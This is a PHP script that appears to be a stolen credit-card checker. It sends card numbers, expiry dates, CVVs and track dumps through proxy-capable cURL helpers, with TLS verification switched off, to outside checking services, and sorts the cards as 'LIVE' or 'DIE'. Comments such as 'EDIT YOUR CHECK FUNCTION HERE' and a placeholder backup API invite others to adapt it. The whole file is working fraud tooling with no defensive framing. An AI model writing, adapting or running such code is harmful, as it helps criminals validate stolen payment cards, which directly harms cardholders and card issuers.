<?php
set_time_limit(0);
function curl($url, $post)
		{
					$curl = ($url);
					$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, $url);  
						curl_setopt($ch, CURLOPT_USERAGENT, $agent);
						curl_setopt($ch, CURLOPT_POST,1);
						curl_setopt($ch, CURLOPT_POSTFIELDS,$post);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_HEADER, 1); 
						if(is_array($header))
						curl_setopt($ch, CURLOPT_HTTPHEADER, $header); 
						if($sock != "")
						{
						curl_setopt($ch, CURLOPT_PROXY, $sock);
						curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
						curl_setopt($ch, CURLOPT_TIMEOUT, 10);
						}
						curl_setopt($ch, CURLOPT_USERPWD, $auth);
						curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
						curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie); 
						curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
						$result = curl_exec($ch);
							curl_close($ch);
					return $result;
		}
function _curl($url,$post="",$usecookie = false) {
    //echo $post;die("sss");
	$ch = curl_init();
	if($post) {
		curl_setopt($ch, CURLOPT_POST ,1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	}
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1"); 
	/*if ($usecookie) {
		curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie); 
		curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);    
	}*/
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
	$result=curl_exec ($ch); 
	curl_close ($ch); 
	return $result; 
}
function debug($html, $file="", $stop=false)
{
	if ($file == "")
	{
		echo "<textarea style=\"width:100%;height:50%;\" wrap=\"off\">".htmlentities($html)."</textarea>";
	}
	else{
		$fp=fopen($file, 'w');
		fwrite($fp, $html);
		fclose($fp);
	}
	if ($stop)
	{
		die();
	}
}
function getBetween($content,$start,$end)
{
	$r=explode($start, $content);
	if (isset($r[1])){
		$r=explode($end, $r[1]);
		if ($r[0] == '') return 'unknown';
		return $r[0];
	}
	return 'unknown';
}
function createLoad()
{
	global $ch,$cookie_jar_path,$cookie_file_path;
	preg_match("/(^.+\/)(.*)/",$_SERVER['SCRIPT_FILENAME'],$linkfolder);
	$string=md5(time().rand(0,999));
	$cookie_jar_path=$linkfolder[1].'/cookie/'.$linkfolder[2]."_".$string.'_jar.txt';
	$fp=fopen($cookie_jar_path,'wb');
	fclose($fp);
	$cookie_file_path=$linkfolder[1].'/cookie/'.$linkfolder[2]."_".$string.'_file.txt';
	$fp=fopen($cookie_file_path,'wb');
	fclose($fp);
	$ch=curl_init();
}
function load($url,$post='',$socks='',$h=false,$nobody=false,$referer='',$timeout=30,$ua='Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8')
{
	global $ch,$cookie_jar_path,$cookie_file_path,$error;
	curl_setopt($ch, CURLOPT_URL, $url);
	if ($h != false)
	{
		curl_setopt($ch, CURLOPT_HEADER, TRUE);
	}
	else
	{
		curl_setopt($ch, CURLOPT_HEADER, FALSE);
	}
	curl_setopt($ch, CURLOPT_NOBODY, $nobody);
	@curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_jar_path);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
	curl_setopt($ch, CURLOPT_VERBOSE, true);
	if ($ua) curl_setopt($ch, CURLOPT_USERAGENT, $ua);
	if ($referer) curl_setopt($ch, CURLOPT_REFERER,$referer);
	if (strncmp($url,"https",6))
	{
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	}
	if ($socks)
	{
		curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
		curl_setopt($ch, CURLOPT_PROXY, $socks);
		if ($type == 3)
		{
			curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
		}
		else if ($type == 4)
		{
			curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
		}
		else
		{
			curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
		}
	}
	if ($post)
	{
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	}
	$data=curl_exec($ch);
	$error=curl_error($ch);
	//echo $error;
	if ($data) Return $data;
	//else Return $error;
	else Return false;
}
function closeLoad()
{
	global $ch,$cookie_jar_path,$cookie_file_path;
	@curl_close($ch);
	@ob_end_clean();
	@unlink($cookie_jar_path);
	@unlink($cookie_file_path);
}

function check($ccnum, $ccmonth, $ccyear, $cccvv) {
	$cccvv = trim($cccvv);
	if ($cccvv == "" || $cccvv == "000" || $cccvv == 0) {
		return checkCCN($ccnum, $ccmonth, $ccyear);
	}
	 else {
		return checkCVV($ccnum, $ccmonth, $ccyear, $cccvv);
	
	}
}



//EDIT YOUR CHECK FUNCTION HERE


function check_dump($ccnum, $exp) {
    $key = "check_dump_".md5($ccnum."_".$exp);
    $fileCache = dirname(__file__) . DIRECTORY_SEPARATOR . 'cookie/'.$key.'.txt';
    $cache = "";

    if(file_exists($fileCache)) {
        $cache = file_get_contents($fileCache);
    }
    if($cache == "") {
        $url = "http://procheck.club/api/dump/";
        $paramPost = "login=".API_LOGIN."&auth=".API_AUTH."&request=".$ccnum."=".$exp;
        //echo $paramPost;die;
        $result = _curl($url,$paramPost);
        $arr = json_decode($result,true);
        if(isset($arr['result'])) {
            file_put_contents($fileCache,$result);
        }
    } else {
        $arr = json_decode($cache,true);
    }

    $return = 3; //unknown
    if (isset($arr["result"]) AND $arr["result"] == 1)
    {
        $return = 1;
    }
    elseif (isset($arr["result"]) AND $arr["result"] == -1)
    {
        $return = 2;
    }
    return $return;
}
function R($s,$e){
	preg_match("/".$e."/",$s,$m);
	return $m[1];
}
function Re($s,$e){
	return html_entity_decode(R($s,$e));
}
function checkCCN($ccnum, $ccmonth, $ccyear, $cczip) {

	$line = $ccnum."|".$ccmonth."|".$ccyear;
	$url= "http://apino1.net/api/?user=12321&pass=24234&code=ccn1&card=".urlencode($line);
	$result = _curl($url, "");
	if (strstr($result,"LIVE"))
	{
		return 1;
	}
	elseif (strstr($result,"DIE"))
	{
		return 2;
	}
	else {
		return 3; //unknown
	}
}


function checkCVV($ccnum, $ccmonth, $ccyear, $cccvv) {
	$line= "$ccnum | $ccmonth | $ccyear | $cccvv";

	$filecookie = fopen("cookie.txt", "w+");
   	$cookie = dirname(__file__) . DIRECTORY_SEPARATOR . 'cookie.txt';


	$url = "BACKUP CVV API HERE".urlencode($line);
	$result = _curl($url,"",$cookie);



		if (stristr($result,"LIVE"))
	{
		return 1;
	}
	elseif (stristr($result,"DIE"))
	{
		return 2;
	}
	else
	 {
	 	return checkCVV4($ccnum, $ccmonth, $ccyear, $cccvv);
	}
}


function checkCVV4($ccnum, $ccmonth, $ccyear, $cccvv)	
{
	$key = $ccnum."|".$ccmonth."|".$ccyear."|".$cccvv;
	$key = "check_".md5($key);
   	$fileCache = dirname(__file__) . DIRECTORY_SEPARATOR . 'cookie/'.$key.'.txt';
    //echo $fileCache;die;
    $cache = "";
    if(file_exists($fileCache)) {
        $cache = file_get_contents($fileCache);
    }
	if($cache == "") {
        $exp = (strlen($ccmonth) == 1?"0".$ccmonth:$ccmonth).substr($ccyear,-2);
        $url = "http://procheck.club/api/request/";
        $paramPost = "login=".API_LOGIN."&auth=".API_AUTH."&gate=".API_GATE."&number=".$ccnum."&cvv=".$cccvv."&exp=".$exp;
        //echo $paramPost;die;
        $result = _curl($url,$paramPost);
        $arr = json_decode($result,true);
        if(isset($arr['result'])) {
            file_put_contents($fileCache,$result);
        }
    } else {
        $arr = json_decode($cache,true);
    }

    //print_r($arr);die;
	if (isset($arr["result"]) AND $arr["result"] == 1)
	{
	    return 1;
	}
	elseif (isset($arr["result"]) AND $arr["result"] == -1)
	{
	    return 2;
	}
	else
	{
	    return 3;
	
	}
	
	
}

?>